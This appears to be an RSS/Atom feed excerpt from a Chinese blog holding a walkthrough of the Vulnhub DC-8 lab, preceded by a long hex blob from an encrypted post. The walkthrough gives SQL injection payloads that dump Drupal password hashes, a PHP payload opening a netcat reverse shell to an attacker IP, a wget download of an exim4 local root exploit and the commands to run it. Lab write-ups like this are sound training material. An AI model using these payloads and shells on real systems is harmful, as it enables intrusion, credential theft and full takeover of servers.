4976ed7f0d74cc125342e227ae10060913ef12a98f415a15cb349c4f3415eda961b400e700dc29e08eb2f7ec05dbdc08942e8a4fb56ca5481d7c5e6a1532e74e1d6a8351a37d2d415a612c3e195dcca8dec11bfd9abd9e69b0da4563be22872496b073999b37e5c3843f40d8ed8f361c81b447e78a95d48c6b3c84bba4363673a44b6a5c84cad83b321c34295184d581a05d86eb5605d10416ff7c110353847709c192bffd0647d115b26c241256fb8bd652fc6cbdae342a1eca70f4ce17fc7445fd908737d8f27964786952165bd09c9221b0e28e0cb0814d80a9cb0dc9f08b7084b0f1d650d9d6ea95a1d8eaec613b6fb2265dc5ca589f8afea0b9fc65440476bde1efd713da8bc3a4ce0c2ff4115f22360337474f8c46bf6c37fbae3b7a4d557c900d98c1b194ac55742b465baec3ca2e5347b54262d10b9b23460cb61bff8a4b788b243e823b2a2d1196fc6bbd24ba4d871e5e4da328fc699e4e029f742b581b7141e63236b397d9cbe23c5b9397d315e94aae0d8e2675a8dfe724ebb410441cdeea0edf314c7ee4762b0a099527295115e38ee5ebc0021ef71c8baae91361598e251e0e485ebb344ace09352ded2660ce39db2d56fa077d12de00bf0f9cfd850bbc346151e225f8fc8aa5a3306d311cb88c5452cbc75668d454d1e4696cbafe6e18dcbc793023ffe6a527af7ecd44bd11ad07fa167379c8567a366efea7b317287959c76c65b89338ac1a5959ff8c4796f577b62534a578a122471546e13eb82ac1a1b4f714c4bea4a4f1831eb499c9e0a1af89dd9e7c1593da800aef74b4c6473a25bfb009a180332a5f084e817c360b8870da1cadc76f93df7d319454917fae6f2bfaa32344c338e5ee714da19b2050b0a811f80b1f0bec531ce0389bd01b0d4fb5c8fc4e4d4419dafb3f73ec20cd6a00637093b5c1d330280b3b48a9f11e8995b9069aca6939485779015c59262455eb7278f0b288efe6d95d55b75ec60a1378419be1e9f4624a1ecc8595593cf934172e421786aca195ad2dddc1458038518cf7e028c331ca6383a20c95260c5c8fe8392cf8229ba815e3c1df86f5e39228dd5f73bede6a66effa8e1dff0a374b4447d2be5ae65217e939c415f87e594cc91e977c093336c387c23fa941e1a20918050e54eef31415a5ab7bf749e596f70ae4d2dc9775603fcdb3b1035f9f85ec9d08d89bfacafa09c33894e2c2b011b0985ac737edb42a2d8f7ea754a2ca20692e1c2c65e359a6f175fba0511b68a8db3fd3754526b0eff5cb123a8ba1eb9a0c05319822fd83daf672dee4f96a77096bf53f2ce28649bbc877c99eb4b333897fea0e899de8a01e9bf3a50dbd0613918694d765af6c1aea6475f98f3b7c9ad578155d139e5215e6f7474e0beb3bd1e811925d28d916751bac8519d09178b5747316cc6340dff2d87f6e6e3b932c8fe00715256a908241be15a9f356325d7bf68971ff4dac33b230bbd3089ccef2d6658bf5a886cb858387a0f86f11c410453a19e632135aaf2f6ab36093f8b0336f4cff4d8db3f5263c7ecbb0bf2d2bc52b39393d1eb5e73dd31fc0e38ae4837a93a2265a57e49f2d7e6f19fa77da7001dbee9290d886f6b3c73d069cdb3185d8cd07133bc91198ded2885f8aa7edcbfe542f7f5a4776ee22ad484a6f94c2270547eb672ff9fe26787c90af98158051f7e198109008450dd1748149316d1078912a8b9d785069ff3d0da91866a3a9572f2e050db96a1c15fb0f33f8131428d5c1f28e603af76d04122a4e84bd72cc2076c8a2e94fe7bcfb9aaea35089eed2ca0e638bfb6db94dccb878bd4b2aa0e621c601f489bb89be01f1a596acd45eec4c440bb4f9c956e6d63458ef4295910eceb6c5bf915705f250169106dd34a44e57730700e80e151efe142dc78169e6ba36ebe323c58a0caacd0cbef437f2c969ad5d1dc0145ab245eeaf0ae7a8e64fda942f577a324540c46b1aa56a710b56458a6c79aac1691b37811d606d1c08674d7b7f3e24dfec177c4ce18f91cfd168b1238da5575deefbb29505e2c0b2025aa4e58d08df3cb703f5d6f61902be434bbd69b9b7bf9e72da1d29282f0105599d340a6165fa5ee71cec0d60330c75497962049dde74f8cac616d030cd49f7064e248895b0324efbf3243bf7a0cee4aee8fefa45a86db63c7185e505558de103e66613a9e87551fceca0df5704e867079eea2423cfa2e5adc22d016f3d177a30c438f0e6b1d8c5ecca03a835b03476e4f399fc0b01b2fafaacaa746e27ccc644f184c999bce65a8cb3d7f99cfcb1a89129dbd45b94cf32a082b976281b64f2e099f59c8604727883a30f1f93c6cc2002748d0607215666229ed9a8d897c81488757134eab29c93b1090ebbb28b9d8efdb9fc540f980c3f6799af974893037fcff24910459e5895ce533e0fdf1a4e28d257b0717c614ec1d857897f7a838e07b1371d7fabc0cde5e2979a535dda81c9a8aaab344a47a9012467df59ecee384b9b7f6f4ac2550687a9576cb4ed6c1b3966ddf7b977bffd6390070ef660b4ece203d2ac6e3eaad846e8c6d1ac328f6414aa87cb7b2c375f027d86ece490abaad10fe52c08c3f4bfb3bbdde0224600cc24516914db25c742a02936f8848f15f7948c17f971cfc9aece7acf7df8835bb56d9ae4e0a9f57c65320c8e3262fe46324a32442fd43f70b634941dddcff804a9cedf6c033ac3551d1beb7346cec1421c360a6ce723c75970b970096f143fa0b9764fdced427d42af50a473ac67519100ed9789b41ad770a5429fdd9018ae5c8e7055f00bc32836cf42574e0bc20cd2a8856daabb29546b954ff7ae5fde9fde6e5626296175b1e482c072f5a9910281173406cf11c73621e8a24f964852fed2cd1525db1cf18213e2ad3355126aa75adb9694051da13194bd2f0484cbf6e73d755d074859157b1f2488a165de174ef7cedd385ffd98b40ebd2e0292e8a91c40fc6d6e085410543b8ea5a7ce1aa22be62c48209b85de1f68c366989ddc76f0eec7d2393509ef8b0238114bf2239e5c9062f6a0ac04bda067c8c57d1c1e9610474aa898b7fd7629927e7fd5e98657e1d305523915daba56be470860eeac7cad37f4cfcd0690c3aec2e252b7f15bdd42e6b1511390015d5c97244daf381566a4630703cad03c990b449128b32c697f895862167c7816831f68f0503fdaf95c1b904754310e36ba4d910522c647df6e6bf9f421fe0e7fc3f5bc0259ad3581a7b47f9af4bebd6b0845a5da97a4c081e81f9da8359f71cbf83e342b5f5994cac1c0d521042853279bd47427ee021912b3b9edc5cea7dc57d516b8f25eb6f48b063bc5f2ab51905b70c25026bb75911af0f155700caacf319fd4f2249a336557ac609255f8990210c9f6c310afc18723ca70f9cd825328fa0c62c190d2ad3b865a23084e8ca4dbfb2333d9d4cf092f7a91d85aa6732ccc5a5cda82a4b1a086536060809744557853e7d4342084a5219e7f1c61b753e3bf32fe665e93258c3bbd02fd6939dfebe74708cc40c4264f2a3580c31fbfdc5c92929e4ef78158dcaf8c1b8a173cb504c54f89f02096e67d9ab92ca4fbaea450c6fa6166d1f5354526d020c1cd6065cd2cad9b1177a6fa56f3f67a55a4054afa27bd4cf39395fa9f5c70c816328c1efe59e4ce92f0bbaf89572b938096f948f9dba89521bef901e4ba3d93841770e71d3b068f6035e7b6b393fba4d663623e45867a82047ff357309826ebeba62e041ad9ca1e455b2cf91b91c38ec5d5df2cb445d6d20f3400b7e56804269848fafce01cef422b74c471227df4c3b9518c93023bab55293bf15bbd43b0a5be9397fce335f46ba264be9641f3d7b7b505fd26df1c731b544b738bc92590a3a38def372baa49e04c0506fc16cfd54b3f68e5caa1b5539e7df6169c2317897e7552537e4781f3883b5728004cca0603ba7d3c6a19111f9b527e60830b768312b74627baf0ad1011303c6fdfde4dd5ffbfcd6ce53a256e81a4a7e53938d889c47a63ab177ffa521095267f5a9b5814607c7540975c7a3c9d1aa3557bebcbb5ab29efa206a9818638595106c6535ae4d92711169cb8bcb29789be5e696b2964597f83287e1a89e538f2aa7f38e687afa95791dce85c6deee8a033156f112b0df93a60460b2c1c25d452fdec49bebb829eda5a86cad59b60990617c93c6104004861c4fbcb2866acb1b88b025154a7a664c48bf2c4c7360ec90df80efa0850502b9788493a45002c486979ec680cd99745b150e11b131768cb8440edb5f36fe247ccae04f853c7c67852f47c39eebd5ec6bf9cdb0f11997aba012e4c7c72f05aef78e5da1f9181c5b8952bd781b6c487b54c3e53303a38cb8f58749cc7330c387bb2ccb0a052e2b60d1463ad296b5997f38ca0c02dcec7d3d19b830daadbe4ad76ed5de67627ac5bbec09f423eddb0dcfa3c8e75fc409b45e9ab5be0ab9e965b6c5bb5052e42bb294aacf3f36c0dd98a1b1e4d8129341bb87d4b2dd8c9af4eab6f7bc6b2965135b7886222389af7bfe82feed3b55774f0518a2ac4207e3d18309a111ed0e4568243b29f607aeb34755620435c03a684dd0078650104f2612036b033254d57c808034fad887e2c69da52948fb0764ae270a33f494f7ee10d2f8cb8d458e13ce8396d112b07f51d7df26b81321f8847bf7c7a8ff0777639fad4f66d4385e8f5f33269f388f3f8e7cadda4bdae987e720b1a1090a60dcc01bede0d00de7cb094bf5bfd2b1c07efe439328227d89ab6b3198d4e15959e9fcb94c7b65d3382cdab9dd8ec696aa714be81634f49f3d88e41b2979a2ff5b374d8011a5e38d55b1a6964961d510e81148066df0dec99ec094f55464dd3e1d7b4438b6f17eed172e67b9c717c3068b0cb5ccf311556d031dc36696049393428b376f92148e75d3b988c75511d3c133f0742126f2d02d021e4515ea1000fc4090a413e8d08f92de328c9b285bee91812aeb2c9f4448b84e11ee098cd1c87ea94479b00ba82dde71e73385fd0d14aa2e092d538fab5d56173e1c0b6db7890efb48c7bf5b7fbb1575cd1c0aeb64d28570fa62dd3aea0cf8e27a7d98c34719516620f84feb9c4f67268972ffe044595e59f6b759ea324c5ceb5ef98463c8646615f3e1d15d17b86f3e1d848341fd574478b302571e8c7a15e4ae4c911fa6ffade0a0daf714295739663615e0897f0484bd9e56a8134f411e717916f214df20c5acf31dc90f0ac1e114cf6b3f671d39365e746d0c84d7545f30ef94492877bb2e155a2f6f5412ec0d615bea2f398a7d819cfdf4893b2a538a2949cdfab530d7303d4826e9017e508fa2e15fa6e58d30782838ad0f934fe3ff3b31bb31be357f902b49e02c43c9464e4600a46f23c2de5d9eb7ccada3e124182aee9798cb7cbf141b611b33e2ce83a162504aa72dd3e45058a1f476824bb6486154cdcaacfff33e3fd37607e517287a19de5a6b6bcf36a23fb502096fb6fa1dd5557fc79849e17bba5b7ba8fa6d871c59700e9834f13261183ff3ff5f5477085657c440c7e506d79880ce2f513143f150e409ecc130a514dd2ce32986e1e1f01687ed4d34db4f96a3b34339b3af630855977f5f07aebac71356400a6e4fee58b3d2ca0906056b69233241cacdc74da24d29df5c10903899eeade3950040a5942755e70fa60e66a4764e228cad5857bb160308fdee19c81059a25c9d7937815890233b1e88b6a67baefe1927e1ef772cdf6d0850597f5b4ee938d7106e8fc507027b2d242d6244eab67a81451995a8886db6ef00a96754b330563a4e2a39bba9b1f5e045acac0050db5060edf66a4cfe4f95ef8d26ee8718a906c48b6adeb1bfc393fd434f743f8ffb34862f85009c03bc8f0ba8cef78037265eb49da4b9a091a4afd54e379c798519e3b5c9bfc2201969d45c6613fabbea3c1d480d676b494a0845e6d18bfa8f3cd8a2f472ec7bb1cba549986ffad6653a8e4e52043bae9339266302fad6b8e5867bfbfc796cec2ec178a78ccd81ef172b5aaee9858c37558048be8ae56b4ad277b7d9622875d1852b06a25ea022536f623fb8f4e1c61941436c7d83d81080e96f73e15fdfbd38ca5b986adbbd636e4b808f072a785e4b95236b6c81f570c6b7dedad345dd849763b872a946a9d737027901a57707ac9d16a54127c0ba382fcc9613461215b5834b0a6aec355056bcecf08f707e79e3e61d6c9fd4e3b62df5f4901782e42b36d4bf6975d12ffd49cf4d1aa5dae8a2780a3f2b6fde9de3a6721e4255e43c31313d6abc19cc7c758eba7d2f8cda80c70427bb8e4a569df547ca9981d7b972bc88fd1a53bad89b9ee36c336f89bf6504412f2e07025024b102f2f0afd4849517c4af0c6d27d8477ce3eb2c40f3dd32c837383c90bca0926d2b3a8f22e3e9b0d30cd02e580db51d7f7f11109d6ca6de1c00c057786c259b4d2446b238df566876b9314f7dc3d8267e91f3e7f8a45f05d692efc68a76024b7114fbb687861313995903deb8fb3b7eb69f2c7ff1053c1c48832d560206d5ece572ab77de3d17423c001f6f07e4b311eb0d98ada6377daa7e580e61511d9fcd59951a506748c0ab297159656a4ef2be16296da8b1e47d943403ad2c77ea70a70c7cc71ff9f9defaae5ebc93f83e109534b5475e3f45999caaa29f0ec45fe57dee2a7a7062f55e9340333f2b3d342c2884d51d7961719f6047b56d5d9594bd10b70427204f9bf861a6dd0c0b1a1b60cead6262598be4a2f12dfb397fe473b502fb600cfb63a849b3d673d6c548681135f21e17602ec17279de9f2f619560b25130ced0129472285f4902b2d9334229ef48c6649d96ecfc4945d8ff4413f7aca7d72d6f045070ee3bd90f6d25f83df10d7c1dd3ef30838c36368758de9e851678c4cab503026893e1fcdc4137093e47167ba9bd32300c6a726d3d49aefc16180a37a16a6929c0a61d33ae608a91efeaa4c18a47b575381c95e05b9b62d7a7ad381aa78977c9cfb543ea6119ce90c08c58d7161c9d432a9b2459ccca09211f413a9e1e74c641f03b10914d344a06d6d2fabab6f7c662ffd40e01588836395ba77e1d70d5dea62547dbe7527e0ccfb4fdad9dd9f0396d3855f36f267973ae1d6b124b8289b291a65203040bfc5fbcf8f69cb85d41097ecb4f7e977e69ba52a1cfefbe63464e28a8342879872a4f919f99b7b232939a0f3d5b8330b1201678a455ef31d7434f19c0aa8324244c2ff6a8b26295ca6d0fc9e1eb2395f38633e3a8f98e36d043c1b9ce6b858cda9629f3126a20f48850fc81ba3efb84ffe3e3f3f9ab9f1712cd57d6a7836385d3321e7a6f75b950a206813fb6de55dba515caa85553b8fc32e2d8c4527e0e438e45cbdd3c2072ef1356c18cc6c135c6bd3635765ee2b212757fd2a58ef83df5063a08f3a8eb0d1451510b34bf60931e93cc770a9769bffead606e7fe202635bb6b810c1b995407faeb171eac2521fd89f073f088e0e66761e6c2e54230ca408ce2d41739b462a9afa1c93bee5b51e9d666f2a558bd681bc516e2f5285b41778ea29366fd75a36f4c8b6d5e0bc47a219a3cce18601ce33ecf76a5a0818d08cd0ea8fade6750ad4cccfaf5e115d6e54c2fd6a79011a674b1bf22d2e4eea4401bd5cf7f7886fb4ae26b6e283a43a0d12f899edc84771e22bd08b62b3fffc8aca0d91158de33cb5a7e06fe47a990a9ccd77099dd8d73db41e46a6d790896f0c55a32f2c7f0827b06344fdeb342b91241a23f38eb50022ae2a2b0e326f6caa521004447f677bbe724d0019f12f69854d06655de321bd3d25929d50510463101d93e4cca02f23a9574974b47b46e6bccb7d23e3741d9af26b603f3aed68c3a86d85e10d00203d06ebb80b0af2df993273eec37d468e3f2267173f9219f6960faf4545b4f0f582082b028ef5d35a0645737fbede1d29ccbc986e8ede38004c892ff6741ed4c65794872a452445cf850305d5a675d4c030bc429cdb1606b6421604027bb3f83e5cb42931a6c6e261c7ebd25f6d8fd224bb23632e5667c972e0678a29f7d73c3e1c232a224e8688f077d260222374fc670166919705be8defa33852706a499c5619190933e7bdc9ed2d12ae0103da68a3e485a16418cff2f807f9f5254a52b83c73b38f0c7fe6c061388eade141d1855422068fb94532b246080d9f9133a534c0c98b361d48b625b18bf9d092fa0aa17122460a307b56d367df9ef37d113956f00b345c4ff3f5cc03f81453644c3f3ef03ee20e30bb523290742b8255b8c553bd56b0657f97c054f75c11f635b03e09b69b1cfc50ae227e4e13f8b2a91843f5bc4e0148c023fa57a6bf099910e5112f110d0a189a3c640465cc08b62ef8104c490083170f2f217f94973accd1ea9ad6c9366671e24afc45cc5610a2ff7a8372d2077e954719a05ff518feb7f07ef5768f5a1b1633f03004393cf912d258282b60ae7b4b01f6493b59bef65334e833a4def1d13648b42cffbbec048892ed3fd50423383d06e1fe62352e3756e9650f811ce0a686523fd82589f4d723c3516f1ff686a2781caa88d11a6294aa93c983a9a20f900a2aa6c5ffa2eb355bc23f3d0009b2cdb68931bbeb6c67f67b857a2ddfafda6c5d5782752dd8efd487f2301f4b243e16ba817261b5929af0f213aaeedea1fc56a1c41f1640cc178f80efbd4c27943b225b009d612e8bac1fc5d312e6ba334b9992ae91efeaa8273f8e3f347d41f9e278b4336af7c0c25c44327ea0c98272ac13d75988c33e9028fe1cda76463a2407b9f8d888416b8543f82260f614f829799db77c0a6a57f9a3e4e187217ce9e86e2a78cf0fa82500568fbde4021eeb4b519aa6d39accf00cccf3f6380869d95b45934d7c6dc0648a6716c45bfedbbb24db24c5882177681175ac03f337740fa07a571ec0cad7734fb0e6d3c86ab5105d88ae58747769ce918ad59d25130722b08d871d526a753ddad6cd12d5aaff2a5f070d75a803ccc4d6511bf99b96988f082e26de7007690526d5a2968ca645628ce360a01fac1bda8cd7635c74cf24e2b85f3b07af4681109a930d586795031fb81381a1973302d6e3d1bd100a552311175d7b38dc639aefd81f0d4ce1763e5a3ee27021526fda168f73106d6bd5ea53c53ef95ee8c5e9ececcc353f767b0f531320d4679c581c2779c53232fa8ee45676c2014797ce815e12292b2ea036fef90dd88186758849d65aab5bf8267dbde5a08ce51b2d7b48e1003490944ac038b31ce0d44a9d38e4a3d638ee4e06edbeae17bc67acce27ace69df5541de32e4d80521c8798bc430d57a29af2ebd4ab225f526bac5f15c17ac263b0db80a80e65c3cea2b4fe29c3adaf2a2930124cef3c232784370dbd22aff1e79d50a70994b04796635bd7b3bd4f6a63c81b35f80ff0c162607b171f65aefb2d112b860516e5d829dd4d90eab787f5111a2cff75d6caa4078f5b8a79ca9e7c50bb9fcc283237e0f0ac435aa8f038c8fb8327a10f74d92634439523223c408ce29787d3dfcfaeddbc95595287e0d79ee1d83adfafb73c8d5457656f98325d400f62c4f03c0a6191d9a90acd9c27e3ad3b38dae20184834fdfd69f6b91cf10a74ae168dd2659a5522439346298bcdf37a1f8feb6602b9414cbb3156f8393553cbbe799df8e765cb3d8a54a2d6d820170c0784f8c77bc0fe57b8cdf86b5e0b32fe0b3f76fc66bdecfb2bce7dd74cc555d7d5fbefcfecd49f76983b948634b1ec91ac1d6ab0ba38498afb94c675bf8092a012c99a398ef9edfd0ad400725ba04ce00a02827edbdde94f4075d3e7c88384bdfef373964a9339daacd33e401f5e1714e360986f4bf8d9f868e1c704d7574168b159465c7c33d67d192283fe257939175d1255c1eb549cb8bded439fed248930743fc7d91a3cc7bdd142034901b36803055a9ad05d41c12813d82d0efc9aa6a8248c43f9ccd9a6071b659115a06451e9a8d9d06b00a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看喔</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
  <entry>
    <title>vulnhub靶场记录DC-8</title>
    <link href="http://w3nx1z1.github.io/2024/04/03/vulnhub%E9%9D%B6%E5%9C%BADC-8/"/>
    <id>http://w3nx1z1.github.io/2024/04/03/vulnhub%E9%9D%B6%E5%9C%BADC-8/</id>
    <published>2024-04-03T08:22:55.429Z</published>
    <updated>2024-04-04T14:35:27.513Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulnhub靶场DC-8"><a href="#vulnhub靶场DC-8" class="headerlink" title="vulnhub靶场DC-8"></a>vulnhub靶场DC-8</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-8 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.This challenge is a bit of a hybrid between being an actual challenge, and being a &quot;proof of concept&quot; as to whether two-factor authentication installed and configured on Linux can prevent the Linux server from being exploited.The &quot;proof of concept&quot; portion of this challenge eventuated as a result of a question being asked about two-factor authentication and Linux on Twitter, and also due to a suggestion by @theart42.The ultimate goal of this challenge is to bypass two-factor authentication, get root and to read the one and only flag.You probably wouldn&#39;t even know that two-factor authentication was installed and configured unless you attempt to login via SSH, but it&#39;s definitely there and doing it&#39;s job.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.</code></pre><p>靶场描述里面告诉我们 DC-8靶场利用了双因素身份验证 最终目标是绕过双因素身份验证，获取root并读取flag 在渗透过程中可能需要使用ssh登陆</p><pre><code>双因素身份验证（Two-Factor Authentication，简称2FA）是一种增强账户安全性的方法，它要求用户在登录时提供两个不同的身份验证因素，通常是密码和另外一种验证方式，如手机验证码、指纹识别、硬件令牌等。这种方法可以有效防止仅仅依靠密码登录账户时可能出现的安全漏洞。通过使用双因素身份验证，即使黑客获取了用户的密码，也无法直接登录账户，因为他们没有第二个身份验证因素。这样可以大大提高账户的安全性，减少被盗号的风险。常见的双因素身份验证方式包括：短信验证码：用户在登录时会收到一条包含验证码的短信，需要输入正确的验证码才能完成登录。软件令牌：用户需要在手机上安装一个生成动态验证码的应用程序，每次登录时需要输入正确的动态验证码。硬件令牌：类似于软件令牌，但是使用物理设备生成动态验证码，如USB密钥或智能卡。生物识别：使用指纹、面部识别或虹膜扫描等生物特征进行身份验证。使用双因素身份验证可以提高账户的安全性，因为即使密码泄露，黑客也无法轻易登录账户。同时，双因素身份验证也可以用于其他敏感操作，如支付、修改账户信息等。</code></pre><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>先扫ip</p><pre><code>nmap 192.168.204.0/24</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404032133501.png" alt="image-20240403213329416"></p><p>ip为<code>192.168.204.134</code> 开放了22端口和80端口</p><p>再扫端口</p><pre><code>nmap -A -p- -v 192.168.204.134</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404032134296.png" alt="image-20240403213454191"></p><pre><code>开放22端口 开放22端口 存在ssh服务 Openssh 版本7.4p1开放80端口 存在web服务 使用Apache中间件 版本2.4.25</code></pre><p>此外我们还可以得知 网站在robots.txt文件中对爬虫或者搜索引擎不能访问的地址进行了限制 下面这些地址是不能访问的</p><pre><code>/includes/ /misc/ /modules/ /profiles/ /scripts/ /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt /LICENSE.txt /MAINTAINERS.txt</code></pre><p>还看到这个网站使用的框架是Drupal7</p><pre><code>http-generator: Drupal 7 (http://drupal.org)</code></pre><p>再用whatweb来看一下指纹信息</p><pre><code>whatweb -v http://192.168.204.134 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404041812860.png" alt="image-20240404181247801"></p><p>接下来扫目录 只查看状态码为200的目录</p><pre><code>python3 dirsearch.py -u http://192.168.204.134 -i 200 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404041815828.png" alt="image-20240404181546792"></p><p>扫出后台登陆地址</p><pre><code>/user/login</code></pre><h3 id="二、访问网站"><a href="#二、访问网站" class="headerlink" title="二、访问网站"></a>二、访问网站</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404041820721.png" alt="image-20240404182015674"></p><p>点一下<code>Welcome to DC-8</code>看到url中出现nid参数</p><pre><code>http://192.168.204.134/?nid=1</code></pre><p>先输入万能钥匙看一下</p><pre><code>1&#39; or 1=1--+</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404041939894.png" alt="image-20240404193946860"></p><p>存在sql注入 复习一波手工注入</p><h4 id="1-联合查询猜字段数"><a href="#1-联合查询猜字段数" class="headerlink" title="1.联合查询猜字段数"></a>1.联合查询猜字段数</h4><p>我们观察上面的报错 发现不需要在最后加上<code>;</code>  也不需要在1后面加<code>&#39;</code></p><pre><code>http://192.168.204.134/?nid=1 order by 2</code></pre><p>到2就回显报错 说明字段数为1 </p><h4 id="2-查询数据库名"><a href="#2-查询数据库名" class="headerlink" title="2.查询数据库名"></a>2.查询数据库名</h4><p>因为只有一个字段 也不需要在测试回显了 我们直接开始查询</p><pre><code>http://192.168.204.134/?nid=9 union select database()</code></pre><p>查到数据库名</p><pre><code>d7db</code></pre><h4 id="3-查询表名"><a href="#3-查询表名" class="headerlink" title="3.查询表名"></a>3.查询表名</h4><pre><code>http://192.168.204.134/?nid=9 union select group_concat(table_name) from information_schema.tables where table_schema=database()</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042000425.png" alt="image-20240404200016380"></p><h4 id="4-查询表中字段名"><a href="#4-查询表中字段名" class="headerlink" title="4.查询表中字段名"></a>4.查询表中字段名</h4><pre><code>http://192.168.204.134/?nid=9 union select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042001296.png" alt="image-20240404200111267"></p><h4 id="5-查询数据"><a href="#5-查询数据" class="headerlink" title="5.查询数据"></a>5.查询数据</h4><pre><code>http://192.168.204.134/?nid=9 union select group_concat(name,pass) from users</code></pre><pre><code>,admin$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z,john$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF</code></pre><h4 id="6-爆破密码"><a href="#6-爆破密码" class="headerlink" title="6.爆破密码"></a>6.爆破密码</h4><p>将两个密码密文粘贴到hash.txt中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042029656.png" alt="image-20240404202902604"></p><pre><code>john --wordlist=password.lst hash.txtjohn --show hash.txt</code></pre><p>得到john用户的密码<code>turtle</code></p><h3 id="三、登陆网站后台"><a href="#三、登陆网站后台" class="headerlink" title="三、登陆网站后台"></a>三、登陆网站后台</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042031823.png" alt="image-20240404203102764"></p><p>依旧是寻找可以注入的点 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042042168.png" alt="image-20240404204212120"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042043205.png" alt="image-20240404204325157"></p><p>Drupal7不同于Drupal8 没有php代码保护 不需要我们在单独安装模块 我们先测试一波 将<code>Text format</code>选择为php code</p><p> <img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042115963.png" alt="image-20240404211557905"></p><p>保存配置 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042118515.png" alt="image-20240404211808459"></p><p>回到Contact Us主页面 随便输入一些信息(注意Email Address部分需要满足一定的邮箱格式) 点击Submit</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042119878.png" alt="image-20240404211935825"></p><p>此时php语句已经成功被执行 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042120312.png" alt="image-20240404212051252"></p><h3 id="四、反弹shell"><a href="#四、反弹shell" class="headerlink" title="四、反弹shell"></a>四、反弹shell</h3><p>有了上面的验证 我们直接写语句进行反弹shell</p><p>重复刚才的步骤  写入</p><pre><code>&lt;?phpsystem(&quot;nc -e /bin/bash 192.168.204.129 1111&quot;); ?&gt;</code></pre><p>在我们的kali攻击机中监听端口</p><pre><code>nc -lvvp 1111</code></pre><p>回到Contact Us主页面 点击Submit 反弹shell成功</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042135637.png" alt="image-20240404213541597"></p><p>创造一个交互式页面</p><pre><code>./46996.sh -m netcat</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042139987.png" alt="image-20240404213933944"></p><h3 id="五、exim4提权"><a href="#五、exim4提权" class="headerlink" title="五、exim4提权"></a>五、exim4提权</h3><p>www-data是个低权限用户 我们查找一下他可以利用的suid提权方法</p><pre><code>find / -type f -perm -u=s 2&gt;dev/null</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042142572.png" alt="image-20240404214211541"></p><p>看到熟悉的exim4 和DC-4一样的操作</p><p>找到脚本的路径</p><pre><code>searchsploit -p 46996.sh</code></pre><p><a href="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051619549.png"><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051619549.png" alt="image-20231205161924515"></a></p><p>将脚本复制到桌面</p><pre><code>cp /usr/share/exploitdb/exploits/linux/local/46996.sh 46996.sh </code></pre><p>开启apache服务</p><pre><code>systemctl start apache2.service</code></pre><p>将这个漏洞攻击文件转移到<code>/var/html/www</code>文件夹下</p><pre><code>mv 46996.sh /var/www/html </code></pre><p>将文件从攻击机下载到靶机<code>/tmp</code>中</p><pre><code>wget http://192.168.160.150/46996.sh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042148502.png" alt="image-20240404214814404"></p><p>赋予执行权限</p><pre><code>chmod +x 46996.sh</code></pre><p>执行脚本 发现得到root权限</p><pre><code>./46996.sh -m netcatwhoami</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042148195.png" alt="image-20240404214841118"></p><p>进入root文件夹 获取flag</p><pre><code>cd /rootcat flag.txt</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404042151688.png" alt="image-20240404215123628"></p><p>至此 DC-8结束</p><h2 id="总结"><a href="#总结" class="headerlink" 